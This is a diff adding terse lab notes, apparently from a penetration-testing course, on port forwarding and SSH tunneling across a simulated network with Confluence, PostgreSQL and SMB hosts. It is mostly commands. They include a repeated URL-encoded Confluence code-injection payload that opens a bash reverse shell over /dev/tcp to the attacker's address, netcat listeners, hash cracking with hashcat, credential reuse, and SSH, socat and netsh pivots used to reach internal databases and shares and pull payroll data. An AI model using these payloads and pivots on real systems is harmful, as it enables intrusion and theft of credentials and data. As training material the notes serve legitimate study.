@@ -1,0 +1,189 @@
+Port redirection and SSH tunneling
+
+Port forwarding with Linux tools
+
+Attacker 192.168.49.53
+Confluence01 192.168.53.63
+PGdatabase01 10.4.53.215
+
+nc -nvlp 4444
+
+curl http://192.168.53.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.49.53/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+id
+cat /var/atlassian/application-data/confluence/confluence.cfg.xml
+
+socat -ddd TCP-LISTEN:2345,fork TCP:10.4.53.215:5432
+
+psql -h 192.168.53.63 -p 2345 -U postgres
+password: D@t4basePassw0rd!
+\l
+\c confluence
+select * from cwd_user;
+
+database_admin
+echo "{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv" > hashes.txt
+hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
+
+sqlpass123
+
+----------
+SSH tunneling
+
+SSH Local port forwarding
+
+Attacker 192.168.49.53
+Confluence01 192.168.53.63
+PGdatabase01 10.4.53.215
+HRshares 172.16.53.217
+
+nc -nvlp 4444
+
+curl http://192.168.53.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.49.53/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+ssh -N -L 0.0.0.0:4455:172.16.53.217:445 database_admin@10.4.53.215
+
+Error: Could not create directory '/home/confluence/.ssh'. Host key verification failed.
+stop here!
+
+nc -nvlp 4445
+
+curl http://192.168.53.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.49.53/4445%200%3E%261%27%29.start%28%29%22%29%7D/
+
+ss -ntplu
+
+smbclient -p 4455 -L //192.168.53.63/ -U hr_admin --password=Welcome1234
+
+smbclient -p 4455 //192.168.53.63/scripts -U hr_admin --password=Welcome1234
+ls
+get Provisioning.ps1
+
+--------------
+SSH Dynamic port forwarding
+
+attacker: 192.168.49.64
+Confluence01 192.168.64.63
+PGdatabase01 10.4.64.215
+HRshares 172.16.64.217
+
+nc -nvlp 4444
+
+curl http://192.168.64.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.49.64/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.64.215
+
+database_admin:sqlpass123
+
+sudo vi /etc/proxychains4.conf
+socks5 192.168.64.63 9999
+
+proxychains smbclient -L //172.16.64.217/ -U hr_admin --password=Welcome1234
+do_connect: Connection to 172.16.64.217 failed (Error NT_STATUS_CONNECTION_REFUSED) !
+
+sudo proxychains nmap -vvv -sT -p4870-4880 -Pn 172.16.64.217 !
+
+---------
+SSH Remote port forwarding
+
+attacker: 192.168.49.64
+Confluence01 192.168.64.63
+PGdatabase01 10.4.64.215
+
+nc -nvlp 4444
+
+curl http://192.168.64.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.49.64/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+sudo systemctl start ssh
+ss -ntplu
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+ssh -N -R 127.0.0.1:2345:10.4.64.215:5432 kali@192.168.49.64
+kali:kali
+
+ss -ntplu
+
+psql -h 127.0.0.1 -p 2345 -U postgres
+postgres:D@t4basePassw0rd!
+SELECT datname FROM pg_database;
+\c hr_backup
+SELECT * FROM payroll;
+OS{0506f1d28b9ef6f756f8f6d84b8ce556}
+
+------------
+SSH Remote dynamic port forwarding
+
+attacker: 192.168.49.64
+Confluence01 192.168.64.63
+PGdatabase01 10.4.64.215
+Multiserver03 192.168.64.64
+
+nc -nvlp 4444
+
+curl http://192.168.64.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.49.64/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+ssh -N -R 9998 kali@192.168.49.64
+
+sudo ss -ntplu
+
+sudo vi /etc/proxychains4.conf
+socks5 127.0.0.1 9999
+
+proxychains nmap -vvv -sT -p9050-9100 -Pn -n 10.4.64.64
+
+no port find open !
+
+-----------
+Port forwarding with Windows tools
+
+rdp_admin:P@ssw0rd!
+
+ssh.exe
+
+Plink
+
+Netsh
+
+attacker: 192.168.49.64
+Multiserver03 192.168.64.64
+PGdatabase01 10.4.64.215
+
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.64.64
+
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.64.64 connectport=22 connectaddress=10.4.64.215
+
+netstat -anp TCP | find "2222"
+netsh interface portproxy show all
+
+sudo nmap -sS 192.168.64.64 -Pn -n -p2222
+
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.64.64 localport=2222 action=allow
+sudo nmap -sS 192.168.64.64 -Pn -n -p2222
+
+ssh database_admin@192.168.64.64 -p2222
+database_admin:sqlpass123
+
+/tmp/netsh_flag
+OS{8e0a2f07fb5255f8deeac237fd940d68}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
